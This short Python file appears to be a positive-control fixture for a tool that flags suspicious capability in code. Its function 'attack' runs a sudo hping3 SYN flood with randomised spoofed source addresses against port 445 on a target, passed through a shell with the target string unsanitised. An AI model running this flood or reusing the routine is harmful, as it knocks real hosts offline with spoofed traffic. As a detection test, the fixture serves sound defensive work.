"""Bare hping3 flood invocation with no audit-tooling context.

Positive control: outside a recognized security-testing distribution the
flood + randomized-source combination must still report suspicious capability.
The callable routine alone does not establish unauthorized targeting.
"""
import subprocess


def attack(target):
    subprocess.run(
        "sudo hping3 -V -d 120 -S -w 64 -p 445 -s 445 --flood --rand-source {}".format(
            target
        ),
        shell=True,
    )
